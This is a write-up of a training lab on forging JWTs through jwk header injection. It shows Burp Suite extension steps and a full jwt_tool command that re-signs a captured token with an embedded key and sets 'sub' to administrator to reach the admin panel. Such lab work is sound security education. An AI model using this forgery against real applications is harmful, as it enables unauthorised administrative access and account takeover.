Title: JWT authentication bypass via jwk header injection
Level: Practitioner 
Desc:  This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.
To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos.
You can log in to your own account using the following credentials: wiener:peter 


![image](https://github.com/user-attachments/assets/d26e42dc-e83a-4dea-8d0f-8549336a476d)

![image](https://github.com/user-attachments/assets/bdabd0e4-e199-4285-827e-33d48887ccb7)


How to attack JWT token with jwk parameter: 
# attempt 1 - use Burpsuite Extension
Here you can create key - please remember to create key with proper algoritm (can be symethric or asymethric)
![image](https://github.com/user-attachments/assets/118e6276-e941-4433-84ca-bc05e7b3035a)

![image](https://github.com/user-attachments/assets/396b1c09-91af-4930-8baf-5591acfd674a)

In the repeater you can find jwt plugin, which gives possibility to make some attack on jwt token, including attacks on jwk parameter:
![image](https://github.com/user-attachments/assets/899a6e1d-bf13-47a9-ae46-24ad846155d2)

Attack - embedded jwk - use created key to sign jwt token
Before that change payload to meet your goals - in my case it was changing sub to administrator

Forged token: 
![image](https://github.com/user-attachments/assets/08af94a6-468e-4c7c-965e-23747d337cb4)

click send to check out if token is valid.

# attempt 2 - using jwt_tool 
First of all I installed this tools using commands:
`sudo apt update && sudo apt install python3 python3-pip
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip3 install -r requirements.txt
`
to run the jwt_tool : `python3 jwt_tool.py -h`

There is some useful option in jwt_tool: 
![image](https://github.com/user-attachments/assets/86a586f4-65ca-48bf-bfc1-3acba5f3bf5f)
(-X (exploit) with i parameter (inject inline JWKS))

command to get valid token: 
`python3 jwt_tool.py eyJraWQiOiIxYWZhMmYzOC1hYmQzLTQ0YWYtYjYxNi01MTg3YjJlNDExNzAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0MzUzMDg3Miwic3ViIjoid2llbmVyIn0.t2JHJdHjvOiMrVx0fUMt_SPIjX-e-KlBrEqFNj0Pv8LnMlXRlCkQxAMzkvDN5IND9_JADwSNlNcpLOjvUdAQTPC57lOpWy26Jyem9FevrXzD-KqhC-r9zKdbuearXs0mvE4FZyK3KtYnrDHwzPtgw4zHdribvqaGiz-Q9MG051ZuWsoZK5Eq98Z1GBLPWkgdw6QCfmtYZLzWHZW3QZ22haio6KhpzsU7c5h27RF4jE-npz8OxnaeslDX8PAly45TEC6zZ613TiIvzZ_NtFSNoPNaCeY0_cUp5ytcFCYAzkXWNlgQ8igB6tcGHErT22WXAtqyVScuuINqE50uVYBKQg -I -pc sub -pv administrator -hc kid -hv jwt_tool -X i`

-hc option says header claim 
-hv options says header value
-pc option says payload claim
-pv option says header value

remember to use jwt_tool as kid parameter because these parameter is used in couple of places.

# How token looks like with kid attack: 
![image](https://github.com/user-attachments/assets/aac95d52-af64-4523-b642-2d961576d6fa)
![image](https://github.com/user-attachments/assets/a4a125ac-812b-4674-8f84-f013d062f326)






























